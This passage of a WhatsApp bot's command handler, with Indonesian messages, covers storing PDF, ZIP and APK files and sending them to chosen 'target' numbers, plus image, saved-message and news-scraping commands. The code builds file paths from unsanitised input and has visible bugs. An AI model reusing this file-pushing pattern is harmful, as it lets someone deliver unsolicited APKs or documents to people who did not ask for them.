fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
//=================================================//
case 'listpdf': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf ZENN MODS WA + sambil reply pesan target* \n\n Contoh 2 : yopdf ZENN MODS WA`
m.reply(teksoooo)
}
break
//=================================================//
case 'yopdf':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
let teks = `${text}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted : hw})
}
}
break
//=================================================//
case 'sendpdf': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted : hw})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addzip':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
//=================================================//
case 'delzip':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
//=================================================//
case 'listzip': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip ZENN MODS WA + sambil reply pesan target* \n\n Contoh 2 : yozip ZENN MODS WA`
m.reply(teksooooo)
}
break
//=================================================//
case 'yozip':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted : hw})
}
}
break
//=================================================//
case 'sendzip': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted : hw})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addapk':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
//=================================================//
case 'delapk':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
//=================================================//
case 'listapk': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk ZENN MODS WA + sambil reply pesan target* \n\n Contoh 2 : yoapk ZENN MODS WA`
m.reply(teksoooooo)
}
break
//=================================================//
case 'yoapk':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted : hw})
}
}
break
//=================================================//
case 'sendapk': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted : hw})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
//=================================================//
case 'delvn':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break
//=================================================//
case 'listvn':{
if (isBan) return m.reply('*Lu Di Ban Owner*')
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}
break
//=================================================//
case 'addmsg': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) throw `Example : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'sendlist': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 haikal.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break
//=================================================//
case 'listmsg': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
m.reply(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//
case 'getmsg': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 haikal.copyNForward(from, msgs[text.toLowerCase()], true)
}
break
// CASE UNTUK FITURE DOWNLOAD
case 'hw1': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw1,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw2': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw2,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw3': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw3,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw4': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw4,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw5': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw5,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw6': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw6,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw7': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw7,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw8': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw8,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw9': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw9,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw10': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw10,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw11': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw11,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw12': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw12,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw13': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw13,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw14': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw14,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw15': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw15,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw16': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw16,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw17': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw17,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw18': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw18,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw19': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw19,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw20': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw20,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw21': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw21,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw22': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw22,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw23': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw23,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw24': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw24,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw25': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw25,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw26': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw26,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw27': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw27,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw28': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw28,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw29': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw29,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw30': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw30,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw31': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw31,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw32': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw32,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw33': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw33,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw34': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw34,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw35': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw35,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw36': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw36,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw37': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw37,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw38': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw38,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw39': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw39,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw40': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw40,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw41': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw41,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw42': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw42,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw43': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw43,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw44': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw44,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw45': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw45,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw46': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw46,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw47': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw47,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw48': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw48,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw49': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw49,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw50': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw50,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw51': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw51,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw52': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw52,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw53': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw53,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw54': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw54,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw55': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw55,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw56': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw56,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw57': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw57,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw58': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw58,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw59': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw59,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw60': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw60,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw61': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw61,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw62': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw62,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw63': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw63,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw64': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw64,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw65': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw65,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw66': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw66,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw67': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw67,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw68': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw68,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw69': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw69,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw70': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw70,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw71': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw71,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw72': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw72,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw73': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw73,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw74': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw74,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw75': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw75,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw76': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw76,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw77': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw77,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw78': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw78,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
case 'hw79': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 haikal.sendMessage(from, { image: hw79,  caption: `© Created By ZENN MODS WA` }, {quoted : hw})
}
break
//=================================================//
case 'fajar':
if (isBan) return m.reply('*Lu Di Ban Owner*')
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
case 'cnn':
if (isBan) return m.reply('*Lu Di Ban Owner*')
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc':
if (isBan) return m.reply('*Lu Di Ban Owner*')
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'tribun':
if (isBan) return m.reply('*Lu Di Ban Owner*')
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'indozone':
if (isBan) return m.reply('*Lu Di Ban Owner*')
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'kompas':
if (isBan) return m.reply('*Lu Di Ban Owner*')
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'detik':
if (isBan) return m.reply('*Lu Di Ban Owner*')
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'daily':
if (isBan) return m.reply('*Lu Di Ban Owner*')
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'inews':
if (isBan) return m.reply('*Lu Di Ban Owner*')
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone':
if (isBan) return m.reply('*Lu Di Ban Owner*')
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'sindo':
if (isBan) return m.reply('*Lu Di Ban Owner*')
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo':
if (isBan) return m.reply('*Lu Di Ban Owner*')
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'antara':
if (isBan) return m.reply('*Lu Di Ban Owner*')
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
